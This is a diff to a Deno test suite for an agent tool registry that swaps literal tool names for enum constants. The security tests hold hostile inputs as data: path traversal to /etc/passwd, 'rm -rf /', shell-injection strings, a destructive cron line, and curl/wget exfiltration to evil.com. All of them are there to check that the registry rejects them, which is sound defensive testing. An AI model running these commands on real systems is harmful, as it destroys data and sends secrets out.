@@ -1,4 +1,8 @@
-import { assertEquals, assertExists } from "jsr:@std/assert@^1.0.0";
+import { assertEquals, assertExists } from "@std/assert";
+import { McpToolName } from "../src/enums.ts";
+
+import { DaemonStatus } from "../src/enums.ts";
+
 import { join } from "@std/path";
 import { ToolRegistry } from "../src/services/tool_registry.ts";
 import { createMockConfig } from "./helpers/config.ts";
@@ -26,7 +30,7 @@ Deno.test("ToolRegistry: registers tools with JSON schemas", () => {
   assertEquals(tools.length >= 5, true, "Should have at least 5 core tools");
 
   // Check read_file tool schema
-  const readFile = tools.find((t: { name: string }) => t.name === "read_file");
+  const readFile = tools.find((t: { name: string }) => t.name === McpToolName.READ_FILE);
   assertExists(readFile, "read_file tool should be registered");
   assertEquals(readFile.description.includes("Read"), true);
   assertExists(readFile.parameters);
@@ -40,7 +44,7 @@ Deno.test("ToolRegistry: read_file - successful read", async () => {
   try {
     const testFile = await helper.createMemoryProjectFile("test.txt", "Hello, World!");
 
-    const result = await helper.execute("read_file", { path: testFile });
+    const result = await helper.execute(McpToolName.READ_FILE, { path: testFile });
 
     assertEquals(result.success, true);
     assertEquals(result.data?.content, "Hello, World!");
@@ -59,7 +63,7 @@ Deno.test("[security] ToolRegistry: read_file - rejects path traversal", async (
   const { helper, cleanup } = await createToolRegistryTestContext("tool-test-traversal-");
 
   try {
-    const result = await helper.execute("read_file", {
+    const result = await helper.execute(McpToolName.READ_FILE, {
       path: "../../etc/passwd",
     });
 
@@ -78,7 +82,7 @@ Deno.test("ToolRegistry: read_file - file not found", async () => {
     const config = createMockConfig(tempDir);
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("read_file", {
+    const result = await registry.execute(McpToolName.READ_FILE, {
       path: join(tempDir, "nonexistent.txt"),
     });
 
@@ -100,7 +104,7 @@ Deno.test("ToolRegistry: write_file - create new file", async () => {
     const registry = new ToolRegistry({ config, db });
     const testFile = join(tempDir, "new.txt");
 
-    const result = await registry.execute("write_file", {
+    const result = await registry.execute(McpToolName.WRITE_FILE, {
       path: testFile,
       content: "New content",
     });
@@ -125,7 +129,7 @@ Deno.test("ToolRegistry: write_file - overwrites existing file", async () => {
 
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("write_file", {
+    const result = await registry.execute(McpToolName.WRITE_FILE, {
       path: testFile,
       content: "New content",
     });
@@ -143,7 +147,7 @@ Deno.test("[security] ToolRegistry: write_file - rejects path traversal", async 
   const { helper, cleanup } = await createToolRegistryTestContext("tool-test-write-sec-");
 
   try {
-    const result = await helper.execute("write_file", {
+    const result = await helper.execute(McpToolName.WRITE_FILE, {
       path: "../../tmp/malicious.txt",
       content: "Bad",
     });
@@ -163,7 +167,7 @@ Deno.test("ToolRegistry: list_directory - lists files and folders", async () => 
     await helper.createFile("file2.md", "content");
     await helper.createDir("subfolder");
 
-    const result = await helper.execute("list_directory", {
+    const result = await helper.execute(McpToolName.LIST_DIRECTORY, {
       path: helper.tempDir,
     });
 
@@ -189,7 +193,7 @@ Deno.test("[security] ToolRegistry: list_directory - rejects path traversal", as
     const config = createMockConfig(tempDir);
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("list_directory", {
+    const result = await registry.execute(McpToolName.LIST_DIRECTORY, {
       path: "../../etc",
     });
 
@@ -208,7 +212,7 @@ Deno.test("ToolRegistry: run_command - executes whitelisted command", async () =
     const config = createMockConfig(Deno.cwd());
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "echo",
       args: ["Hello"],
     });
@@ -228,7 +232,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks dangerous commands", as
     const config = createMockConfig(Deno.cwd());
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "rm",
       args: ["-rf", "/"],
     });
@@ -253,7 +257,7 @@ Deno.test("ToolRegistry: search_files - finds files by pattern", async () => {
 
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("search_files", {
+    const result = await registry.execute(McpToolName.SEARCH_FILES, {
       pattern: "*.ts",
       path: tempDir,
     });
@@ -279,7 +283,7 @@ Deno.test("ToolRegistry: execute - returns error for unknown tool", async () => 
 
     assertEquals(result.success, false);
     assertExists(result.error);
-    assertEquals(result.error.includes("not found") || result.error.includes("unknown"), true);
+    assertEquals(result.error.includes("not found") || result.error.includes(DaemonStatus.UNKNOWN), true);
   } finally {
     await cleanup();
   }
@@ -297,8 +301,8 @@ Deno.test("ToolRegistry: all tool executions are logged", async () => {
     const registry = new ToolRegistry({ config, db, traceId: "test-trace-123" });
 
     // Execute multiple tools
-    await registry.execute("read_file", { path: testFile });
-    await registry.execute("list_directory", { path: tempDir });
+    await registry.execute(McpToolName.READ_FILE, { path: testFile });
+    await registry.execute(McpToolName.LIST_DIRECTORY, { path: tempDir });
 
     // Allow time for batched logging
     await new Promise((resolve) => setTimeout(resolve, 150));
@@ -322,7 +326,7 @@ Deno.test("ToolRegistry: execute - handles tool execution exceptions", async () 
     const registry = new ToolRegistry({ config, db });
 
     // Try to read from invalid path - should catch exception and return error
-    const result = await registry.execute("read_file", { path: "some-file.txt" });
+    const result = await registry.execute(McpToolName.READ_FILE, { path: "some-file.txt" });
 
     assertEquals(result.success, false);
     assertExists(result.error);
@@ -340,7 +344,7 @@ Deno.test("ToolRegistry: write_file - handles permission denied", async () => {
     const registry = new ToolRegistry({ config, db });
 
     // Try to write to root (should fail with permission)
-    const result = await registry.execute("write_file", {
+    const result = await registry.execute(McpToolName.WRITE_FILE, {
       path: "/root/forbidden.txt",
       content: "test",
     });
@@ -362,7 +366,7 @@ Deno.test("ToolRegistry: run_command - handles command execution failure", async
     const registry = new ToolRegistry({ config, db });
 
     // Execute a command that will fail
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "ls",
       args: ["/nonexistent-directory-99999"],
     });
@@ -385,7 +389,7 @@ Deno.test("ToolRegistry: search_files - handles invalid glob patterns", async ()
     const registry = new ToolRegistry({ config, db });
 
     // Search with pattern in non-existent directory
-    const result = await registry.execute("search_files", {
+    const result = await registry.execute(McpToolName.SEARCH_FILES, {
       pattern: "*.txt",
       path: "/nonexistent-search-path",
     });
@@ -407,7 +411,7 @@ Deno.test("ToolRegistry: list_directory - handles non-existent directory", async
     const config = createMockConfig(tempDir);
     const registry = new ToolRegistry({ config, db });
 
-    const result = await registry.execute("list_directory", {
+    const result = await registry.execute(McpToolName.LIST_DIRECTORY, {
       path: join(tempDir, "does-not-exist"),
     });
 
@@ -427,11 +431,11 @@ Deno.test("ToolRegistry: getTools - returns all registered tools", () => {
 
   assertEquals(tools.length, 5);
   const toolNames = tools.map((t) => t.name);
-  assertEquals(toolNames.includes("read_file"), true);
-  assertEquals(toolNames.includes("write_file"), true);
-  assertEquals(toolNames.includes("list_directory"), true);
-  assertEquals(toolNames.includes("search_files"), true);
-  assertEquals(toolNames.includes("run_command"), true);
+  assertEquals(toolNames.includes(McpToolName.READ_FILE), true);
+  assertEquals(toolNames.includes(McpToolName.WRITE_FILE), true);
+  assertEquals(toolNames.includes(McpToolName.LIST_DIRECTORY), true);
+  assertEquals(toolNames.includes(McpToolName.SEARCH_FILES), true);
+  assertEquals(toolNames.includes(McpToolName.RUN_COMMAND), true);
 });
 
 Deno.test("ToolRegistry: execute - validates required parameters", async () => {
@@ -442,7 +446,7 @@ Deno.test("ToolRegistry: execute - validates required parameters", async () => {
     const registry = new ToolRegistry({ config, db });
 
     // Try to execute read_file without path parameter
-    const result = await registry.execute("read_file", {});
+    const result = await registry.execute(McpToolName.READ_FILE, {});
 
     assertEquals(result.success, false);
     assertExists(result.error);
@@ -464,7 +468,7 @@ Deno.test("[security] ToolRegistry: read_file - blocks path traversal to /etc/pa
     const registry = new ToolRegistry({ config, db });
 
     // Attempt to read sensitive system file via path traversal
-    const result = await registry.execute("read_file", {
+    const result = await registry.execute(McpToolName.READ_FILE, {
       path: "../../../etc/passwd",
     });
 
@@ -496,7 +500,7 @@ Deno.test("[security] ToolRegistry: write_file - blocks writing to System direct
 
     // Attempt to write to System directory (should be protected)
     // Test 1: Try path traversal to escape Memory and reach System
-    const traversalResult = await registry.execute("write_file", {
+    const traversalResult = await registry.execute(McpToolName.WRITE_FILE, {
       path: join(tempDir, "Memory", "..", "System", "journal.db"),
       content: "CORRUPTED DATA",
     });
@@ -518,7 +522,7 @@ Deno.test("[security] ToolRegistry: write_file - blocks writing to System direct
     }
 
     // Test 2: Try absolute path outside workspace
-    const absoluteResult = await registry.execute("write_file", {
+    const absoluteResult = await registry.execute(McpToolName.WRITE_FILE, {
       path: "/etc/cron.d/malicious",
       content: "* * * * * root rm -rf /",
     });
@@ -538,7 +542,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks shell injection with se
     const registry = new ToolRegistry({ config, db });
 
     // Attempt shell injection with command chaining
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "echo",
       args: ["hello; rm -rf /"],
     });
@@ -569,7 +573,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks backtick command substi
     const registry = new ToolRegistry({ config, db });
 
     // Attempt command substitution with backticks
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "echo",
       args: ["`whoami`"],
     });
@@ -597,7 +601,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks $() command substitutio
     const registry = new ToolRegistry({ config, db });
 
     // Attempt command substitution with $()
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "echo",
       args: ["$(cat /etc/passwd)"],
     });
@@ -624,7 +628,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks pipe to dangerous comma
     const registry = new ToolRegistry({ config, db });
 
     // Attempt to pipe to a dangerous command
-    const result = await registry.execute("run_command", {
+    const result = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "echo",
       args: ["data | rm -rf /"],
     });
@@ -651,7 +655,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks curl/wget for data exfi
     const registry = new ToolRegistry({ config, db });
 
     // Attempt to use curl for exfiltration
-    const curlResult = await registry.execute("run_command", {
+    const curlResult = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "curl",
       args: ["https://evil.com/exfil?data=secret"],
     });
@@ -664,7 +668,7 @@ Deno.test("[security] ToolRegistry: run_command - blocks curl/wget for data exfi
     );
 
     // Attempt to use wget for exfiltration
-    const wgetResult = await registry.execute("run_command", {
+    const wgetResult = await registry.execute(McpToolName.RUN_COMMAND, {
       command: "wget",
       args: ["https://evil.com/exfil"],
     });
@@ -684,7 +688,7 @@ Deno.test("[security] ToolRegistry: list_directory - blocks listing /etc", async
     const registry = new ToolRegistry({ config, db });
 
     // Attempt to list /etc directory
-    const result = await registry.execute("list_directory", {
+    const result = await registry.execute(McpToolName.LIST_DIRECTORY, {
       path: "/etc",
     });
 
@@ -708,7 +712,7 @@ Deno.test("[security] ToolRegistry: write_file - blocks writing to /tmp outside 
     const registry = new ToolRegistry({ config, db });
 
     // Attempt to write outside workspace
-    const result = await registry.execute("write_file", {
+    const result = await registry.execute(McpToolName.WRITE_FILE, {
       path: "/tmp/malicious_file.txt",
       content: "malicious content",
     });
@@ -729,7 +733,7 @@ Deno.test("[security] ToolRegistry: search_files - blocks search in /home", asyn
     const registry = new ToolRegistry({ config, db });
 
     // Attempt to search in /home directory
-    const result = await registry.execute("search_files", {
+    const result = await registry.execute(McpToolName.SEARCH_FILES, {
       pattern: "*.txt",
       path: "/home",
     });
